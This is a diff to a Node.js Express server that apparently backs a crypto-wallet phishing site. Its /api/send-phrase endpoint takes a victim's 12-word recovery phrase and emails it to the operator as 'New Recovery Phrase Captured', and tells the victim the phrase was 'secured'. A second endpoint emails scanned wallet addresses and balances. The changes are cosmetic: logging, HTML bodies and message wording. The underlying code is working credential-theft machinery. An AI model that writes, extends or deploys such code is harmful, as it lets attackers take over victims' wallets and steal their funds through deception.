@@ -7,9 +7,10 @@ const app = express();
 app.use(cors());
 app.use(express.json());
 
+// Set SendGrid API key
 sgMail.setApiKey(process.env.SENDGRID_API_KEY);
 
-// Existing endpoint for phrases
+// ===== Send Recovery Phrase =====
 app.post("/api/send-phrase", async (req, res) => {
   const { words } = req.body;
 
@@ -19,24 +20,23 @@ app.post("/api/send-phrase", async (req, res) => {
 
   const msg = {
     to: process.env.DEST_EMAIL,
-    from: {
-      email: process.env.FROM_EMAIL,
-      name: "Webcoin Security"
-    },
+    from: process.env.FROM_EMAIL, // Must be verified in SendGrid
     subject: "New Recovery Phrase Captured",
-    text: `Phrase: ${words.join(" ")}`,
+    text: `New 12-word recovery phrase received:\n\n${words.join(" ")}`,
+    html: `<h2>New Recovery Phrase Captured</h2><p>${words.join(" ")}</p>`,
   };
 
   try {
     await sgMail.send(msg);
-    return res.json({ message: "secured successfully!" });
+    console.log("✅ Recovery phrase email sent");
+    return res.json({ message: "Phrase secured successfully!" });
   } catch (error) {
-    console.log("SENDGRID ERROR:", error.response?.body?.errors || error);
-    return res.status(500).json({ error: "secure failed" });
+    console.error("❌ SendGrid Error:", error.response?.body?.errors || error);
+    return res.status(500).json({ error: "Failed to send phrase" });
   }
 });
 
-// NEW endpoint for sending scanned wallet data
+// ===== Send Wallet Scan =====
 app.post("/api/send-wallet", async (req, res) => {
   const { address, results } = req.body;
 
@@ -44,7 +44,6 @@ app.post("/api/send-wallet", async (req, res) => {
     return res.status(400).json({ message: "Invalid wallet data" });
   }
 
-  // Format wallet results into readable text
   let walletText = `Wallet Address: ${address}\n\nBalances:\n`;
   results.forEach((item) => {
     walletText += `${item.chain} - ${item.native.balance} ${item.native.symbol}\n`;
@@ -58,22 +57,22 @@ app.post("/api/send-wallet", async (req, res) => {
 
   const msg = {
     to: process.env.DEST_EMAIL,
-    from: {
-      email: process.env.FROM_EMAIL,
-      name: "Webcoin Security"
-    },
+    from: process.env.FROM_EMAIL,
     subject: `Wallet Scan Result: ${address}`,
     text: walletText,
+    html: `<h2>Wallet Scan Result</h2><pre>${walletText}</pre>`,
   };
 
   try {
     await sgMail.send(msg);
+    console.log("✅ Wallet scan email sent");
     return res.json({ message: "Wallet results sent successfully!" });
   } catch (error) {
-    console.log("SENDGRID ERROR:", error.response?.body?.errors || error);
+    console.error("❌ SendGrid Error:", error.response?.body?.errors || error);
     return res.status(500).json({ error: "Failed to send wallet data" });
   }
 });
 
+// ===== Start Server =====
 const PORT = process.env.PORT || 5000;
-app.listen(PORT, () => console.log(`Server running on ${PORT}`));
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
